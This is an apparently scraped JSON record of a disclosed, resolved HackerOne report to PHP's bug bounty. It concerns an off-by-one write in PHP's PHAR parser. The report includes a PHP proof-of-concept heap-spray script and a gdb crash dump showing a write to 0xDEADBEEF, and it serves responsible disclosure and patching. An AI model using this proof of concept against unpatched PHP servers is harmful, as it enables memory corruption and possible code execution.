{"id":195586,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTU1ODY=","url":"https://hackerone.com/reports/195586","title":"Memory corruption when parsing a hostile PHAR archive","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-01-03T20:48:44.541Z","submitted_at":"2017-01-03T20:48:44.541Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-13T09:31:06.661Z","bug_reporter_agreed_on_going_public_at":"2019-10-13T09:31:06.605Z","team_member_agreed_on_going_public_at":"2019-10-13T09:20:15.543Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The vulnerability was reported to PHP's security team and was fixed:\n* Ticket 73768: https://bugs.php.net/bug.php?id=73768\n* Git commit: https://gist.github.com/anonymous/84961673ee34be7f1a52b83dd872af50\n\nThe PHAR module in all PHP versions (5.6.9 and below, 7.1.0 and below) is vulnerable to a memory corruption and possibly a remote code execution attack when parsing a hostile PHAR archive. Here are the technical details:\n* File: ext\\phar\\phar.c\n* Function:  phar_parse_pharfile()\n\nThe function incorrectly '\\0' terminates the buffer in case the alias does not match:\n```\nbuffer[tmp_len] = '\\0';\n```\nWhen a hostile archive sets tmp_len to be manifest_length - 14, this will write the '\\0' just outside the buffer (off-by-one), thus overriding emalloc's metadata.\n\nThe assignment should be replaced with:\n```\nbuffer[MIN(tmp_len, (size_t)(endbuffer - buffer) - 1)] = '\\0';\n```\n\nThis vulnerability was demonstrated with this PHP script:\n```\n\u003c?php\n\t$length = 192;\n\t$array  = array();\n\t$x = 0;\n\twhile ( $x \u003c 4 ){\n\t\t$array[$x++] = str_repeat($x, ($length - 20));\n\t}\n\n\ttry{\n\t\t$p = Phar::LoadPhar('example_hostile.phar', 'alias.phar');\n\t}\n\tcatch(Exception $e){\n\t\techo \"Failed to load the phar archive\\n\";\n\t}\n\n\t$s = str_repeat(\"\\xef\\xbe\\xad\\xde\", ($length - 20) / 4);\n\twhile ( $x \u003c 8 ){\n\t\t$array[$x++] = str_repeat($x, ($length - 20));\n\t}\n?\u003e\n```\nWhen parsing the hostile PHAR archive it caused a crash when trying to write data into the 0xDEADBEEF address:\n```\n#0  0x80260e75 in _emalloc ()\n#1  0x802610d8 in _safe_emalloc ()\n#2  0x801fac73 in zif_str_repeat ()\n#3  0x8031b662 in execute_internal ()\n#4  0x80274dce in dtrace_execute_internal ()\n#5  0x8030cf65 in ?? ()\n#6  0x802c56da in execute_ex ()\n#7  0x80274c35 in dtrace_execute_ex ()\n#8  0x8031d1b6 in zend_execute ()\n#9  0x8028510d in zend_execute_scripts ()\n#10 0x80224054 in php_execute_script ()\n#11 0x8031f01f in ?? ()\n#12 0x800fe64f in main ()\n(gdb) info reg\neax            0xdeadbeef\t-559038737\necx            0xb5000074\t-1258291084\nedx            0xd\t13\nebx            0xb5000040\t-1258291136\nesp            0xbffedf80\t0xbffedf80\nebp            0xb50131e0\t0xb50131e0\nesi            0x7\t7\nedi            0x1\t1\neip            0x80260e75\t0x80260e75 \u003c_emalloc+101\u003e\neflags         0x210282\t[ SF IF RF ID ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n```\nThis demonstrates how this memory corruption can be used to achieve a memory write in an arbitrary memory address in the PHP's process, thus maybe enabling a remote code exploitation over the targeted PHP server.","vulnerability_information_html":"\u003cp\u003eThe vulnerability was reported to PHP\u0026#39;s security team and was fixed:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eTicket 73768: \u003ca title=\"https://bugs.php.net/bug.php?id=73768\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73768\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73768\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGit commit: \u003ca title=\"https://gist.github.com/anonymous/84961673ee34be7f1a52b83dd872af50\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fanonymous%2F84961673ee34be7f1a52b83dd872af50\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/anonymous/84961673ee34be7f1a52b83dd872af50\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe PHAR module in all PHP versions (5.6.9 and below, 7.1.0 and below) is vulnerable to a memory corruption and possibly a remote code execution attack when parsing a hostile PHAR archive. Here are the technical details:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eFile: ext\\phar\\phar.c\u003c/li\u003e\n\u003cli\u003eFunction:  phar_parse_pharfile()\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe function incorrectly \u0026#39;\\0\u0026#39; terminates the buffer in case the alias does not match:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebuffer[tmp_len] = \u0026#39;\\0\u0026#39;;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen a hostile archive sets tmp_len to be manifest_length - 14, this will write the \u0026#39;\\0\u0026#39; just outside the buffer (off-by-one), thus overriding emalloc\u0026#39;s metadata.\u003c/p\u003e\n\n\u003cp\u003eThe assignment should be replaced with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebuffer[MIN(tmp_len, (size_t)(endbuffer - buffer) - 1)] = \u0026#39;\\0\u0026#39;;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis vulnerability was demonstrated with this PHP script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$length\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e192\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$array\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$x\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$x\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$array\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$x\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$x\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$length\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003etry\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ePhar\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"na\"\u003eLoadPhar\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;example_hostile.phar\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;alias.phar\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eException\u003c/span\u003e \u003cspan class=\"nv\"\u003e$e\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Failed to load the phar archive\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$s\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\xef\\xbe\\xad\\xde\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$length\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$x\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e \u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$array\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$x\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$x\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$length\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen parsing the hostile PHAR archive it caused a crash when trying to write data into the 0xDEADBEEF address:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e#0  0x80260e75 in _emalloc ()\n#1  0x802610d8 in _safe_emalloc ()\n#2  0x801fac73 in zif_str_repeat ()\n#3  0x8031b662 in execute_internal ()\n#4  0x80274dce in dtrace_execute_internal ()\n#5  0x8030cf65 in ?? ()\n#6  0x802c56da in execute_ex ()\n#7  0x80274c35 in dtrace_execute_ex ()\n#8  0x8031d1b6 in zend_execute ()\n#9  0x8028510d in zend_execute_scripts ()\n#10 0x80224054 in php_execute_script ()\n#11 0x8031f01f in ?? ()\n#12 0x800fe64f in main ()\n(gdb) info reg\neax            0xdeadbeef   -559038737\necx            0xb5000074   -1258291084\nedx            0xd  13\nebx            0xb5000040   -1258291136\nesp            0xbffedf80   0xbffedf80\nebp            0xb50131e0   0xb50131e0\nesi            0x7  7\nedi            0x1  1\neip            0x80260e75   0x80260e75 \u0026lt;_emalloc+101\u0026gt;\neflags         0x210282 [ SF IF RF ID ]\ncs             0x73 115\nss             0x7b 123\nds             0x7b 123\nes             0x7b 123\nfs             0x0  0\ngs             0x33 51\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis demonstrates how this memory corruption can be used to achieve a memory write in an arbitrary memory address in the PHP\u0026#39;s process, thus maybe enabling a remote code exploitation over the targeted PHP server.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:20:15.631Z","allow_singular_disclosure_after":-35667066.005525775,"singular_disclosure_allowed":true,"vote_count":12,"voters":["mik317","smodnix","spetr0x","steveareno","unihorn","m4ver1k","itachinfp","script_kid","koleosus","mindgame88","and 2 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1467841,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:44:34.551Z","updated_at":"2017-02-07T07:44:34.551Z","additional_data":{"old_severity":"High (7.1)","new_severity":"Medium","old_severity_id":17239,"new_severity_id":24027},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467842,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:44:42.003Z","updated_at":"2017-02-07T07:44:42.003Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467843,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:44:45.956Z","updated_at":"2017-02-07T07:44:45.956Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467857,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you.","markdown_message":"\u003cp\u003eThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T07:57:15.975Z","updated_at":"2017-02-07T07:57:15.975Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025869,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:20:15.560Z","updated_at":"2019-10-13T09:20:15.560Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026216,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:31:06.622Z","updated_at":"2019-10-13T09:31:06.622Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026217,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:31:06.676Z","updated_at":"2019-10-13T09:31:06.676Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}